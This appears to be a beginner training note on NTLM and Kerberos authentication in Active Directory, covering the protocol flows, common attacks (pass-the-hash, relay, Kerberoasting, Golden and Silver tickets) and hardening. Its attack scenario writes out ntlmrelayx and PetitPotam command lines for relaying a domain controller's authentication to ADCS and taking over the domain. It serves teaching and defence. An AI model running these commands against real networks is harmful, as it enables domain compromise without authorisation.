---
tags: [active-directory, basics, foundations, vapt]
difficulty: beginner
module: "66 - AD Foundations and Core Concepts"
topic: "66.08 NTLM vs Kerberos Authentication Basics"
---

# NTLM vs Kerberos Authentication Basics

## 1. Introduction to AD Authentication

In a Windows Active Directory environment, authenticating users and services securely is paramount. Historically, Microsoft relied on **NTLM** (NT LAN Manager), a suite of security protocols providing authentication, integrity, and confidentiality. However, due to inherent cryptographic weaknesses and design flaws in NTLM, Microsoft introduced **Kerberos** as the default authentication protocol starting in Windows 2000. 

Despite Kerberos being the modern standard, NTLM remains heavily prevalent due to legacy application requirements, hardcoded IP configurations, and fallback mechanisms, making both protocols critical for VAPT professionals to understand.

## 2. NTLM Authentication Deep Dive

NTLM utilizes a **Challenge/Response** mechanism. The user's password is not transmitted over the network. Instead, the server challenges the client to perform a cryptographic calculation using the hash of the user's password.

### 2.1 The NTLM Hash Format
Windows stores passwords in the SAM database (locally) or the NTDS.dit (Domain Controller) as an **NT hash** (often colloquially called an NTLM hash).
- **Algorithm**: The NT hash is calculated by taking the user's plaintext password, converting it to UTF-16LE, and hashing it using MD4.
- **Weakness**: MD4 is incredibly fast and completely un-salted, making it extremely vulnerable to offline brute-force and rainbow table attacks.

### 2.2 NTLMv2 Challenge/Response Flow
When a client authenticates to a server using NTLMv2, the following 3-way handshake occurs:

```text
+----------+                                    +----------+
|  Client  |                                    |  Server  |
+----------+                                    +----------+
     |                                               |
     | 1. NEGOTIATE_MESSAGE (Type 1)                 |
     |---------------------------------------------->|
     | (Client declares NTLM support & features)     |
     |                                               |
     | 2. CHALLENGE_MESSAGE (Type 2)                 |
     |<----------------------------------------------|
     | (Server sends a 16-byte random Challenge)     |
     |                                               |
     | 3. AUTHENTICATE_MESSAGE (Type 3)              |
     |---------------------------------------------->|
     | (Client hashes the Challenge with its         |
     |  NT hash and sends the Response back)         |
     |                                               |
```

**Note on Domain Auth**: If the server is not a Domain Controller, it cannot verify the response itself (it doesn't have the user's NT hash). It packages the Type 3 message and forwards it to the DC via the Netlogon Secure Channel (Pass-Through Authentication).

## 3. Kerberos Authentication Deep Dive

Kerberos is a ticket-based authentication protocol designed by MIT. It operates on the concept of a **Trusted Third Party**, known as the **Key Distribution Center (KDC)**, which in an AD environment is the Domain Controller.

Kerberos relies heavily on symmetric cryptography (AES-256 by default in modern AD) and strict time synchronization (usually a maximum 5-minute clock skew).

### 3.1 Core Kerberos Components
- **KDC (Key Distribution Center)**: The Domain Controller service that issues tickets.
- **AS (Authentication Service)**: The part of the KDC that issues the TGT.
- **TGS (Ticket Granting Service)**: The part of the KDC that issues Service Tickets.
- **TGT (Ticket Granting Ticket)**: A proof-of-identity ticket. Encrypted with the `krbtgt` account's password hash.
- **Service Ticket (TGS-REP)**: A ticket granting access to a specific service. Encrypted with the target service account's password hash.

### 3.2 Kerberos Authentication Flow

```text
+----------+                                +----------------+
|  Client  |                                |      KDC       |
+----------+                                | (Domain Ctlr)  |
     |                                      +----------------+
     | 1. AS-REQ (Authentication Request)           |
     |    (Encrypted timestamp using User Hash)     |
     |--------------------------------------------->|
     |                                              |
     | 2. AS-REP (Authentication Reply)             |
     |<---------------------------------------------|
     |    (Returns the TGT, encrypted by KDC)       |
     |                                              |
     | 3. TGS-REQ (Service Ticket Request)          |
     |    (Sends TGT + Request for Service SPN)     |
     |--------------------------------------------->|
     |                                              |
     | 4. TGS-REP (Service Ticket Reply)            |
     |<---------------------------------------------|
     |    (Returns Service Ticket)                  |
     |                                              |
     |                                      +----------------+
     | 5. AP-REQ (Application Request)      | Target Service |
     |    (Sends Service Ticket to Server)  | (e.g., MSSQL)  |
     |------------------------------------->+----------------+
```

### 3.3 The PAC (Privilege Attribute Certificate)
The Kerberos ticket contains a PAC. The PAC holds the user's authorization data, primarily their group memberships (SIDs). The target service reads the PAC to determine if the user is authorized (e.g., checking if the user is in the local Administrators group). The KDC digitally signs the PAC to prevent tampering.

## 4. Protocol Comparison Summary

| Feature | NTLM | Kerberos |
| :--- | :--- | :--- |
| **Authentication Type** | Challenge/Response | Ticket-Based |
| **Dependency** | IP Addresses / Hostnames | Requires FQDNs / SPNs |
| **Cryptography** | MD4, DES, HMAC-MD5 | AES-128, AES-256 (RC4 legacy) |
| **Mutual Authentication** | No (Client authenticates to Server) | Yes (Client and Server authenticate) |
| **Speed** | Slower (Pass-through to DC required) | Faster (Tickets are cached locally) |
| **Delegation** | Cannot delegate credentials safely | Supports constrained/unconstrained delegation |

## 5. Offensive Perspective: NTLM Attacks

Due to its design, NTLM is heavily targeted by attackers:
- **Pass-the-Hash (PtH)**: Because the NT hash is the equivalent of the private key in NTLM, an attacker who extracts an NT hash from memory (via Mimikatz) can inject it into their session to authenticate as that user, without ever knowing the plaintext password.
- **NTLM Relay**: Because NTLM lacks mutual authentication and often lacks cryptographic binding, an attacker can position themselves in the middle (Man-in-the-Middle), intercept an NTLM Type 1/2/3 handshake from a victim, and instantly forward (relay) it to a target server to execute commands as the victim. (Mitigated by SMB Signing and LDAP Signing).

## 6. Offensive Perspective: Kerberos Attacks

Kerberos relies on encrypted blobs passing over the network, opening up different attack vectors:
- **AS-REP Roasting**: If a user has "Do not require Kerberos preauthentication" enabled, an attacker can send an AS-REQ on their behalf without needing a password. The KDC replies with an AS-REP containing a blob encrypted with the user's password hash. The attacker can extract this and crack it offline.
- **Kerberoasting**: Any authenticated user can request a Service Ticket (TGS-REP) for any SPN. The Service Ticket is encrypted with the password hash of the service account. The attacker extracts the ticket and brute-forces the service account's password offline.
- **Pass-the-Ticket (PtT)**: Attackers can extract raw `.kirbi` Kerberos tickets from LSASS memory and inject them into their session.
- **Golden Ticket**: If an attacker compromises the `krbtgt` account hash (e.g., via DCSync), they can forge their own TGTs, granting themselves permanent, undetectable Domain Admin access.
- **Silver Ticket**: If an attacker compromises a specific service account's hash, they can forge a Service Ticket granting them administrative access strictly to that service, without ever talking to the KDC.

## 7. Remediation and Hardening

- **Disable NTLMv1**: Ensure `LmCompatibilityLevel` is set to 5 (Send NTLMv2 response only. Refuse LM & NTLM).
- **Enforce SMB and LDAP Signing**: This completely kills traditional NTLM Relay attacks.
- **Phase out NTLM**: Audit NTLM usage using Event ID 8004 (NTLM Operational log) and slowly restrict NTLM traffic via the "Network security: Restrict NTLM" group policies.
- **Audit Kerberos Encryption**: Ensure the environment relies on AES-256 and disable legacy RC4 encryption, which is trivially fast to crack during Kerberoasting.

## Real-World Attack Scenario

**The Context:** An attacker has plugged into the corporate LAN. They notice the organization enforces SMB signing on all workstations and servers, meaning traditional NTLM relaying to SMB to gain a reverse shell is impossible. However, the organization runs an Active Directory Certificate Services (ADCS) server with the Web Enrollment feature enabled (`http://pki.corp.local/certsrv`).

**The Thought Process:** While SMB signing kills SMB-to-SMB relaying, it does not prevent an attacker from capturing an NTLM authentication over SMB and relaying it to an entirely different protocol that lacks cryptographic binding, such as HTTP. The ADCS Web Enrollment endpoint is a prime target because it accepts NTLM authentication over HTTP and allows the requester to generate a highly privileged client authentication certificate.

**The Execution:**
1. **Setting up the Relay:** The attacker configures `ntlmrelayx` to listen for incoming SMB connections and relay them to the ADCS HTTP endpoint, requesting a certificate for the "User" template.
   `ntlmrelayx.py -t http://10.0.0.15/certsrv/certfnsh.asp -smb2support --adcs --template User`
2. **Triggering Authentication:** The attacker uses `PetitPotam` to force a highly privileged server (e.g., the primary Domain Controller, `DC01`) to attempt an SMB authentication back to the attacker's machine.
   `python3 petitpotam.py 10.0.0.99 10.0.0.5` *(Attacker IP, DC IP)*
3. **The Relay:** `DC01` attempts to authenticate to the attacker's machine via SMB. `ntlmrelayx` intercepts the NetNTLMv2 hash and instantly relays it over HTTP to the ADCS server.
4. **Certificate Extraction:** The ADCS server accepts the relayed authentication, believing it is communicating with `DC01`. It issues a base64-encoded client certificate for the Domain Controller machine account.

**The Outcome:** The attacker receives a valid client certificate for the Domain Controller. They use `Rubeus` to request a Kerberos TGT using this certificate (PKINIT), immediately gaining Domain Admin privileges and bypassing the network's SMB signing defenses entirely.

## 8. Chaining Opportunities

- **Responder -> NTLM Relay**: Use Responder to spoof LLMNR/NBT-NS, capture a machine's NTLM authentication, and relay it to an ADCS web enrollment endpoint to instantly forge a client certificate (ESC8).
- **BloodHound -> Kerberoasting**: Identify service accounts with high privileges (e.g., Domain Admins) via BloodHound, then specifically target those accounts for Kerberoasting to minimize noise.
- **DCSync -> Golden Ticket**: Abuse a DACL misconfiguration to DCSync the `krbtgt` hash, then forge a 10-year Golden Ticket for persistence.

## 9. Related Notes

- [[09 - Service Principal Names SPNs and Delegation]]
- [[07 - Access Control Lists ACLs and Access Control Entries ACEs]]
- [[01 - Active Directory Structure and Components]]
